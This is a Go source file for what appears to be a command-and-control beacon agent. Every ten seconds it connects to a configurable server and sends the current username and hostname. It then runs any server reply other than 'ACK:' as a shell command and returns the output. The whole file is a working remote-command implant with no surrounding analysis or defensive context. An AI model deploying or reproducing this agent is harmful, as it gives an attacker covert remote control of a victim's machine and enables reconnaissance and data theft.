package main

import (
	"bufio"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"os/user"
	"strings"
	"time"
)

var (
	serverAddr = flag.String("addr", "localhost:8080", "Server address")
	AgentID    = "dev-agent-001"
)

func main() {
	flag.Parse()
	hostname, err := os.Hostname()
	if err != nil {
		log.Fatalf("failed to get hostname: %v", err)
	}
	currentUser, err := user.Current()
	if err != nil {
		log.Fatalf("failed to get current user: %v", err)
	}
	for {

		conn, err := net.Dial("tcp", *serverAddr)
		if err != nil {
			log.Fatalf("failed to connect to server: %v", err)
		}

		message := fmt.Sprintf("%s:%s:%s\n", AgentID, currentUser.Username, hostname)
		_, err = conn.Write([]byte(message))
		if err != nil {
			log.Fatalf("failed to send message: %v", err)
		}

		reader := bufio.NewReader(conn)
		response, err := reader.ReadString('\n')
		if err != nil {
			log.Fatalf("failed to read response: %v", err)
		}
		if strings.HasPrefix(response, "ACK:") {
			log.Printf("beacon acknowledged")
		} else {
			cmd := exec.Command("sh", "-c", strings.TrimSpace(response))
			output, err := cmd.CombinedOutput()
			if err != nil {
				log.Printf("failed to execute command: %v", err)
			}
			log.Printf("command output: %s", output)
			conn.Write([]byte(output))
		}
		conn.Close()
		time.Sleep(10 * time.Second)
	}
}
